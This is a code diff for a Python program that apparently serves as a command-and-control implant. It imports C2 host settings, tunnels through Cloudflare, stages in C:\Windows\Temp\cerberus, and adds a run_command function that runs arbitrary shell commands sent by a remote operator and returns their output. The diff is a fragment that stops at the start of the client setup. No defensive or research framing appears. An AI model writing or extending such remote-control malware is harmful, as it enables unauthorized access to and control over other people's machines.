@@ -2,20 +2,58 @@ import subprocess
 import threading
 import socketio
 import time
+import locale
+import os
 from config import C2_HOST, C2_PORT, MACHINE_ID
-C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append
 
-# get the console encoding
+C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append
+cwd = os.path.expandvars(r"C:\Windows\Temp\cerberus")
+
 def get_console_encoding():
     """Read the active OEM codepage from the system registry."""
     result = subprocess.run("chcp", shell=True, capture_output=True, text=True, encoding="ascii")
-    # output is like "Active code page: 862"
     try:
         return "cp" + result.stdout.strip().split(": ")[1]
     except:
-        return "cp850"  # safe fallback
+        return "cp850"  #generic fallback
 
 CONSOLE_ENCODING = get_console_encoding()
+
+def run_command(command: str) -> str:
+    """Run a command in the current cwd, update cwd if it was a cd command."""
+    global cwd
+
+    stripped = command.strip()
+
+    # Handle cd manually — subprocess.run can't report its own cwd back to us
+    if stripped.lower().startswith("cd"):
+        parts = stripped.split(None, 1)
+        if len(parts) == 1:
+            # bare "cd" — just return current directory like cmd.exe does
+            return cwd
+        target = parts[1].strip()
+        new_cwd = os.path.normpath(os.path.join(cwd, target))
+        if os.path.isdir(new_cwd):
+            cwd = new_cwd
+            return ""
+        else:
+            return f"The system cannot find the path specified: {new_cwd}"
+    try:
+        result = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=10,
+            cwd=cwd,
+            encoding=CONSOLE_ENCODING,
+            errors="replace"
+        )
+        return (result.stdout + result.stderr) or "(no output)"
+    except subprocess.TimeoutExpired:
+        return "[timeout]"
+    except Exception as e:
+        return f"[error] {e}"
 
 def make_client():
     """Create a fresh socketio client with event handlers registered."""
